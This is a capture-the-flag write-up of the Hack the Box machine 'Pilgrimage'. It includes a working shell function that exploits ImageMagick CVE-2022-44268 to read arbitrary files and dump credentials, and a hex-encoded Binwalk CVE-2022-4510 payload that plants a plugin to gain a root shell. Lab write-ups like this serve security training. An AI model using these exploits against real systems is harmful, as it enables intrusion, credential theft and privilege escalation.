---
title: "HTB • Pilgrimage"
tags:
  - "Beginner"
  - "Linux"
  - "Easy Difficulty"
  - "Web"
  - "CVE"
  - "PHP"
  - "Bash"
  - "File Upload"
excerpt: "Pilgrimage is an easy Linux machine on Hack the Box that involves multiple Common Vulnerabilities and Exposures (CVEs), code review, and a simple case of Linux privilege escalation"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-pilgrimage/"
---


Pilgrimage is an easy Linux-based [**Hack the Box**](https://app.hackthebox.com/machines/Pilgrimage) machine created by [**coopertim13**](https://app.hackthebox.com/users/55851) that involves exploiting Common Vulnerabilities and Exposures (CVEs), PHP and Bash code review, and web enumeration. We first ran a port scan, revealing an SSH server on port 22, and an HTTP server on port 80. Exploration of the web server uncovered a Git data directory which we used to recover the site's source code. We discovered a vulnerable **ImageMagick** instance being used in the PHP source to parse uploaded images. We used **CVE-2022-44268** to recover the contents of arbitrary files including the web database, which contained credentials used to login via SSH as _emily_. An unusual script being run as root appeared to sort through files in a writable directory using an outdated version of **Binwalk**, which happened to be vulnerable to **CVE-2022-4510**. This vulnerability was exploited using a specially crafted PFS file to gain access as root.


## Initial Recon

We began by setting up our environment and conducting a port scan using a [custom nmap wrapper script](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh). This script aids in quickly and reliably scanning for open ports on the target.

~~~zsh
# Set up environment variables and run a port scan
echo rhost="10.10.11.219" >> .env # The machine IP address
. ./.env && ctfscan $rhost
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

The scan reported a total of two open ports:

| Transport | Port | Protocol | Product | Version                 |
|:----------|:-----|:---------|:--------|-------------------------|
| TCP       | 22   | SSH      | OpenSSH | 8.4p1 Debian 5+deb11u1  |
| TCP       | 80   | HTTP     | nginx   | 1.18.0                  |


## Web

A standard GET request sent to the HTTP server on port 80 was answered with a redirect to <http://pilgrimage.htb>. We added this hostname to `/etc/hosts`{:.filepath} to easily access the intended website from our browser.

~~~zsh
curl -i "http://$rhost" # request web index ~> found hostname: pilgrimage.htb
echo -e "$rhost\tpilgrimage.htb" | sudo tee -a /etc/hosts # Save hostname
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

![Web index](web-index.png)

Just clicking around the website, we discover a login and registration form at [/login.php](http://pilgrimage.htb/login.php) and [/register.php](http://pilgrimage.htb/register.php) respectively. We proceeded to brute-force additional paths using [dirsearch](https://github.com/maurosoria/dirsearch).

~~~zsh
# Brute-force files and directories
dirsearch -u http://pilgrimage.htb -e php,html,txt
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}
 
Dirsearch quickly found a Git data folder stored at `/.git`{:.filepath}. We recovered the entire Git repository associated with this folder using [git-dumper](https://pypi.org/project/git-dumper/).

~~~zsh
# Recover Git repository from web server
git-dumper "http://pilgrimage.htb/.git" ./pilgrimage.git
cd pilgrimage.git
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}


### Code Review

In the repository we recovered, there were several PHP sources along with an ImageMagick AppImage executable used by `index.php`{:.filepath} to shrink the uploaded images. There is also an SQLite database stored at `/var/db/pilgrimage`{:.filepath} which is used to retrieve login credentials in `login.php`{:.filepath}. After some review, we determined that there were no obvious vulnerabilities in the PHP source code.

~~~php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
~~~
{:file="index.php" .nolineno}

~~~php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));

  if($stmt->fetchAll()) {
    $_SESSION['user'] = $username;
    header("Location: /dashboard.php");
  }
  else {
    header("Location: /login.php?message=Login failed&status=fail");
  }
}
~~~
{:file="login.php" .nolineno}

#### ImageMagick

We found the ImageMagick version packed into the `magick`{:.filepath} executable by running it with the `--version` flag, then looked for Common Vulnerabilities or Exposures (CVEs) affecting that version.

~~~zsh
# Execute with user-mode virtualization
qemu-x86_64 ./magick --version
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~text
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
~~~
{:file="STDOUT" .nolineno}

We eventually came across a relevant information disclosure bug tracked as [CVE-2022-44268](https://www.cvedetails.com/cve/CVE-2022-44268/).

> ImageMagick 7.1.0-49 is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary. file (if the magick binary has permissions to read it).

There was a detailed proof-of-concept (PoC) explaining the steps to exploit this vulnerability [on GitHub](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC). We used this information to create a shell function that automated exploitation in this instance, then we fetched the SQLite database referenced in the PHP source.

~~~zsh
# function to automate exploitation of CVE-2022-44268 (in this case)
pilgrimage_file_disclosure() {
  
  # Create blank template PNG
  [ ! -f ./blank.png ] && convert xc:none ./blank.png

  # Add desired file name to profile field
  pngcrush -text a "profile" "$1" ./blank.png ./x.png &> /dev/null

  # Collect the parsed file
  exfil=$(curl http://pilgrimage.htb/ -F 'toConvert=@x.png' -so /dev/null -w '%{redirect_url}' |
    grep -Eo 'http://pilgrimage\.htb/shrunk/[0-9a-f]+\.png')
  curl $exfil -so ./exfil.png

  # Extract data from profile field
  identify -verbose ./exfil.png | grep -E -A1 '^[0-9a-f]{72}$' | xxd -r -p
}

pilgrimage_file_disclosure "/etc/hosts" # Test helper function
pilgrimage_file_disclosure "/var/db/pilgrimage" > ./pilgrimage.db # Recover database
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

Within the SQLite database, the _users_ table contained a single row with the username **`emily`** and password **`abigchonkyboi123`**. We used these credentials to login to the machine via SSH.

~~~zsh
# Dump "users" table
sqlite3 -markdown ./pilgrimage.db << EOF
SELECT * FROM users;
EOF

# Login with credentials from the database
ssh "emily@$rhost"
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}


## Privilege Escalation

When printing the process tree, we noticed an unusual bash script running as root at `/usr/sbin/malwarescan.sh`{:.filepath}. This script was reviewed in search of a path forward.

~~~bash
# List process tree
ps auxf | more

# Inspect malware scan script
more /usr/sbin/malwarescan.sh
~~~
{:file="emily@pilgrimage ➤ bash" .nolineno}

~~~bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
  filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
  binout="$(/usr/local/bin/binwalk -e "$filename")"
  for banned in "${blacklist[@]}"; do
    if [[ "$binout" == *"$banned"* ]]; then
      /usr/bin/rm "$filename"
      break
    fi
  done
done
~~~
{:file="/usr/sbin/malwarescan.sh"}

It appears to run a tool called [Binwalk](https://github.com/ReFirmLabs/binwalk) to identify file signatures for each file in the uploaded images directory at `/var/www/pilgrimage.htb/shrunk`{:.filepath}. If the output of `binwalk -e $filename` produces the substring "Executable script" or "Microsoft executable", then the file is deleted. The script itself did not seem to have any vulnerabilities, so we checked the version of Binwalk.

~~~bash
# Get binwalk version
/usr/local/bin/binwalk --help | head
~~~
{:file="emily@pilgrimage ➤ bash" .nolineno}

~~~text
Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
...
~~~
{:file="STDOUT" .nolineno}

### CVE-2022-4510

When searching the web for known vulnerabilities affecting this version of Binwalk, we came across [CVE-2022-4510](https://nvd.nist.gov/vuln/detail/CVE-2022-4510). There was also an [ExploitDB entry](https://www.exploit-db.com/exploits/51249) providing a proof-of-concept exploit written in Python.

> A path traversal vulnerability was identified in ReFirm Labs binwalk from version 2.1.2b through 2.3.3 included. By crafting a malicious PFS filesystem file, an attacker can get binwalk's PFS extractor to extract files at arbitrary locations when binwalk is run in extraction mode (-e option). Remote code execution can be achieved by building a PFS filesystem that, upon extraction, would extract a malicious binwalk module into the folder .config/binwalk/plugins. This vulnerability is associated with program files src/binwalk/plugins/unpfs.py. This issue affects binwalk from 2.1.2b through 2.3.3 included. 

#### Exploitation

After looking at the CVE description and Python PoC, it was noted that the exploit was simply comprised of a special PFS file followed by some Python code. We copied the PFS contents from the PoC to a bash variable, then added some trailing Python code to add the SUID/SGID bits to `/bin/sh`{:.filepath}, and finally copied the exploit to a new file in `/var/www/pilgrimage.htb/shrunk`{:.filepath}. after a few seconds, our code was executed and we spawned a root shell.

~~~bash
# Exploit CVE-2022-4510
# https://www.exploit-db.com/exploits/51249
pfs="\x50\x46\x53\x2f\x30\x2e\x39\0\0\0\0\0\0\0\x01\0\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x63\x6f\x6e\x66\x69\x67\x2f\x62\x69\x6e\x77\x61\x6c\x6b\x2f\x70\x6c\x75\x67\x69\x6e\x73\x2f\x62\x69\x6e\x77\x61\x6c\x6b\x2e\x70\x79\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x34\x12\0\0\xa0\0\0\0\xc1\0\0\x2e"
# This will add the SUID/SGID bits to /bin/sh
code="import os;os.chmod('/bin/sh',0o6755)"

# Deliver the exploit
echo -e "$pfs$code" > /var/www/pilgrimage.htb/shrunk/pwnwalk.pfs
# Spawn root shell
sleep 5s; /bin/sh -p
~~~
{:file="emily@pilgrimage ➤ bash" .nolineno}

After grabbing the flags, we removed the SUID and SGID bits from `/bin/sh`{:.filepath} along with any filesystem artifacts left from exploitation of CVE-2022-4510.

~~~sh
# Clean up
chmod -s /bin/sh # Normalize /bin/sh
rm -f /var/www/pilgrimage.htb/shrunk/pwnwalk.pfs # Remove exploit PFS
rm -f /root/.config/binwalk/plugins/binwalk.py # Remove malicious plugin
exit # Pwned!
~~~
{:file="root@pilgrimage ➤ sh" .nolineno}